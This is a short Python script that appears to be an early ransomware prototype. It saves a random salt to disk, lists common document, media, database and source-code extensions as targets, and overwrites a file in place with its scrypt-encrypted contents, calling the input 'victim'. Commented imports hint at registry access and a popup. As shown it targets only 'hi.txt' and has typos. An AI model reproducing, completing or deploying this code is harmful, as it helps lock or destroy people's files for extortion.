#import os
#import sys
#import threading
#import ctypes
#import winreg
#import tkinker as tk
from tkinter import messagebox
#from cryptography.hazmat.primitives.kdf import Scrypt
import scrypt
#from pathlib import Path
import secrets


salt = secrets.token_bytes(16)
file = open('salt.txt','wb')
file.write(salt)
file.close()

file_suffixes = ['.txt', '.doc', '.xls', '.xlsx', '.pdf', '.jpg', '.png', '.mp3', '.mp4', '.zip', '.rar', '.7z', '.sql', '.db', '.cpp', '.html', '.css', '.js', ',json', '.xml', '.ppt', '.pptx']


def upd(filename):
    print('encryption process started- this make take a bit of time')
    file = open(filename, 'rb')
    contents = []
    for line in file:
        contents.append(line)
    file.close()
    new_contents = encrypt_(contents)
    file = open(filename, 'wb')
    for item in new_contents:
        file.write(item)
    file.close()

def encrypt_(victim):
  result = []
  for item in victim:
      item = scrypt.encrypt(item, salt)
      result.append(item)
  return result
    
upd('hi.txt')
print('encryption process finished, ty for waiting!')
